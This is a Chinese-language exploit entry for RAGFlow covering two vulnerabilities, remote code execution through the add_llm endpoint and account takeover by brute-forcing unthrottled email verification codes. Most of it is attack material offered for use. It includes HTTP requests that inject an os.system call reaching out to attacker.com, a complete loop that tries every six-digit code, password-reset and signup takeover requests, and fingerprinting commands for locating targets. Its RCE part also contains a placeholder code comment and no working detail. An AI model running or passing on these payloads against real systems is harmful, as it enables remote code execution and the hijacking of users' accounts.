---
id: RAGFLOW-RCE-AND-ACCOUNT-TAKEOVER
title: RAGFlow 远程代码执行与账户接管漏洞
product: ragflow
vendor: Infiniflow
version_affected: "<= 0.18.1"
severity: CRITICAL
tags: [rce, account_takeover, auth_bypass, brute_force, ai, rag, 无需认证]
fingerprint: ["RAGFlow", "ragflow", "/api/v1/", "/v1/user/", "infiniflow", "ragflow.io", "/api/signup", "/api/verify-code"]
---

## 漏洞描述

RAGFlow 是 Infiniflow 开源的 RAG（检索增强生成）引擎，用于深度文档理解和问答系统。存在两个严重漏洞：

1. **CVE-2024-10131**: `llm_app.py` 中的 `add_llm` 函数使用用户输入动态实例化类，缺乏输入验证导致 RCE。
2. **CVE-2025-68668**: 验证码爆破无频率限制，攻击者可暴力破解邮箱验证码实现任意账户注册、登录和密码重置（账户接管）。

## 影响版本

- CVE-2024-10131: RAGFlow ~0.11.0（及相近版本）
- CVE-2025-68668: RAGFlow <= 0.18.1（截至披露时无补丁）

## 前置条件

- 目标 RAGFlow 服务（默认80/443端口）可从网络访问
- CVE-2024-10131: 需已认证用户 Token（可通过账户接管获取）
- CVE-2025-68668: 仅需网络访问，无需认证

## 利用步骤

### CVE-2024-10131: add_llm RCE

`add_llm` 接口用 `req['llm_factory']` 和 `req['llm_name']` 动态实例化模型类，可注入恶意类名执行代码：

```http
POST /v1/llm/add HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token>

{
  "llm_factory": "__import__('os').system('id')",
  "llm_name": "evil",
  "model_type": "chat",
  "api_key": "xxx"
}
```

或利用已知的 model factory 映射注入：
```python
# llm_app.py 中 factory2llm 字典被用户输入索引
# 攻击者构造 llm_factory 值触发任意类加载
```

**影响版本**: RAGFlow 0.11.0（及相近版本）

### CVE-2025-68668: 验证码爆破 → 账户接管

`/api/verify-code` 和 `/api/signup` 端点无速率限制，6 位数验证码可被暴力破解。

#### 方法1: 密码重置接管

```http
POST /api/verify-code HTTP/1.1
Host: target
Content-Type: text/plain;charset=UTF-8

{"application":"RAGFlow","organization":"infiniflow","username":"victim@email.com","name":"victim","code":"000000","type":"login"}
```

爆破 code 字段（000000-999999），成功后调用密码重置：

```http
POST /api/set-password HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="userOwner"

infiniflow
------Boundary
Content-Disposition: form-data; name="userName"

victim
------Boundary
Content-Disposition: form-data; name="oldPassword"


------Boundary
Content-Disposition: form-data; name="newPassword"

NewPassword123!
------Boundary
Content-Disposition: form-data; name="code"

<爆破得到的验证码>
------Boundary--
```

#### 方法2: 任意用户注册

```http
POST /api/signup HTTP/1.1
Host: target
Content-Type: text/plain;charset=UTF-8

{"application":"RAGFlow","organization":"infiniflow","username":"attacker","name":"attacker","password":"Password123!","confirm":"attacker","email":"victim@email.com","emailCode":"000000","agreement":true}
```

同样爆破 emailCode 字段。

#### 方法3: 验证码登录接管

登录页面也使用 `/api/verify-code` 端点，爆破验证码可直接登录任意用户。

**影响版本**: RAGFlow <= 0.18.1（截至披露时无补丁）

### 未授权 API 探测

```bash
# 检查实例是否存在
curl -s http://target/ | grep -i "ragflow"
curl -s http://target/api/v1/
curl -s http://target/v1/user/info

# 检查 Casdoor SSO
curl -s http://target/api/get-account
```

## Payload

### CVE-2024-10131: add_llm RCE

```bash
# 需先通过账户接管获取 token
curl -s -X POST http://target/v1/llm/add \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{
    "llm_factory": "__import__(\"os\").system(\"curl http://attacker.com/callback?rce=proof\")",
    "llm_name": "evil",
    "model_type": "chat",
    "api_key": "xxx"
  }'
```

### CVE-2025-68668: 验证码爆破（密码重置接管）

```bash
# 爆破验证码（000000-999999）
for code in $(seq -w 000000 999999); do
  resp=$(curl -s -X POST http://target/api/verify-code \
    -H "Content-Type: text/plain;charset=UTF-8" \
    -d "{\"application\":\"RAGFlow\",\"organization\":\"infiniflow\",\"username\":\"victim@email.com\",\"name\":\"victim\",\"code\":\"$code\",\"type\":\"login\"}")
  echo "$code: $resp"
  echo "$resp" | grep -q '"status":0' && echo "FOUND: $code" && break
done
```

## 验证方法

```bash
# 1. 确认实例存在
curl -s http://target/ | grep -i "ragflow"

# 2. 验证码端点无速率限制：连续请求无 429 响应即存在漏洞
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://target/api/verify-code \
    -H "Content-Type: text/plain;charset=UTF-8" \
    -d '{"application":"RAGFlow","organization":"infiniflow","username":"test@test.com","name":"test","code":"000000","type":"login"}'
done

# 3. RCE 验证：通过 OOB 回调确认命令执行
# 在 attacker.com 监听 HTTP 请求，触发 add_llm payload 后检查是否收到回调

# 4. 账户接管后确认：使用获取的 token 访问受限 API
curl -s http://target/v1/user/info -H "Authorization: Bearer <token>" | grep '"username"'
```

## 指纹确认

```bash
curl -s http://target/ | grep -iE "ragflow|infiniflow"
curl -s http://target/v1/user/ 2>/dev/null
curl -sI http://target/ | grep -iE "ragflow"
```
